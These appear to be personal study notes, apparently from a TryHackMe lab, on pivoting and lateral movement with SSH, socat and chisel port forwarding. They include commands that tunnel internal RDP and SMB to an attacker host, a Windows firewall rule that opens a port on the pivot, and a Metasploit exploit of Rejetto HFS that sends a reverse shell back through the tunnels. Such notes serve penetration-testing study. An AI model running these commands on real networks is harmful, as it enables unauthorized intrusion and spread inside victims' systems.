


---

# 🧠 Port Forwarding Mind Map (Lateral Movement)

```
PORT FORWARDING (Goal: Reach blocked internal services)
│
├── 1. Why Use It?
│     ├── Target blocks SMB/RDP/WinRM from your machine
│     ├── Network segmentation stops direct reach
│     └── Need to pivot THROUGH a compromised host
│
├── 2. Techniques
│     │
│     ├── Local Port Forwarding (LPORT → Target)
│     │     Example: ssh -L 445:<target>:445 user@pivot
│     │     You → Pivot → Target
│     │
│     ├── Remote Port Forwarding (Pivot → You)
│     │     Example: ssh -R 8080:localhost:80 user@your-VPS
│     │     Pivot exposes its local port to you
│     │
│     ├── Dynamic Port Forwarding (SOCKS Proxy)
│     │     Example: ssh -D 9050 user@pivot
│     │     Allows full tunneling via proxychains
│     │
│     └── Static TCP Relay (socat / chisel)
│           Example: chisel client <attacker>:8000 R:445:target:445
│           Forward TCP through encrypted tunnel
│
├── 3. Tools
│     ├── ssh (native)
│     ├── chisel (fast, lightweight)
│     ├── socat (TCP relay)
│     ├── proxychains (for SOCKS)
│     └── Metasploit autoroute / portfwd
│
├── 4. When to Use
│     │
│     ├── SMB blocked → Forward 445
│     ├── RDP blocked → Forward 3389
│     ├── WinRM blocked → Forward 5985/5986
│     ├── WMI/DCOM unreachable → Forward 135 + ephemeral ports
│     └── Multiple subnets → use SOCKS + proxychains
│
└── 5. Attack Flow (Simple)
      │
      ├── Compromise Host A (pivot)
      ├── Set port forward (ssh/chisel)
      ├── Test port: nmap localhost -p 445
      ├── Use lateral movement (psexec, wmi, rdp…)
      └── Expand access deeper into internal network
```

---
# 🚀 SSH Tunnelling (Core Commands)

## **1. Remote Port Forwarding (-R)**

**Project internal port → attacker machine**

`ssh user@ATTACKER -R <attacker_port>:<target>:<target_port> -N`

**Example:** RDP pivot

`ssh user@1.1.1.1 -R 3389:3.3.3.3:3389 -N`

➡️ Attacker uses: `127.0.0.1:3389`

---

## **2. Local Port Forwarding (-L)**

**Expose attacker service → internal machine**

`ssh user@ATTACKER -L *:<pivot_port>:127.0.0.1:<attacker_port> -N`

Example (attacker's port 80 available to pivot):

`ssh user@1.1.1.1 -L *:80:127.0.0.1:80 -N`

Add firewall rule on Windows pivot:

`netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`

---

## **3. Dynamic Port Forwarding (SOCKS Proxy)**

**Scan internal network using proxychains**

`ssh user@ATTACKER -R 9050 -N`

`/etc/proxychains.conf`:

`socks4 127.0.0.1 9050`

Usage:

`proxychains curl http://internal`

---

# 🛠 socat Port Forwarding

### Simple pivot:

`socat TCP4-LISTEN:8888,fork TCP4:3.3.3.3:3389`
listen on port 8888 anything that happens 
note::!!ff forwd it to tagrget ip on 3389 port

on attacker box login with pivot but the user name of hidden target
### Expose attacker port 80 to internal:

`socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`

---

# 🎯 Real-world Flow (THM Example)

## Pivot RDP Through Jump Host

On pivot:

`socat TCP4-LISTEN:13389,fork TCP4:THMIIS:3389`

On attacker:

`xfreerdp /v:THMJMP2:13389 /u:user /p:pass`

---

# 🧨 Multi-Tunnel (Rejetto HFS Exploit)

### Needed:

- **RPORT** → forwarded to attacker
    
- **SRVPORT** → forwarded to pivot
    
- **LPORT** → forwarded to pivot
    

### SSH full chain:
pivot machine.
`ssh user@ATTACKER ^ -R 8888:THMDC:80 ^ -L *:6666:127.0.0.1:6666 ^ -L *:7878:127.0.0.1:7878 -N`





user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

        
---

# 📌 Key Concepts (Quick Recall)

- **-R** = internal → attacker
    
- **-L** = attacker → internal
    
- **Dynamic** = SOCKS proxy (multi-host scanning)
    
- **socat** = lightweight port forward without SSH
    
- **Windows needs firewall rules** for socat/SSH listeners



tools to check
==
    Sshuttle
    Rpivot
    Chisel
    Hijacking Sockets with Shadowmove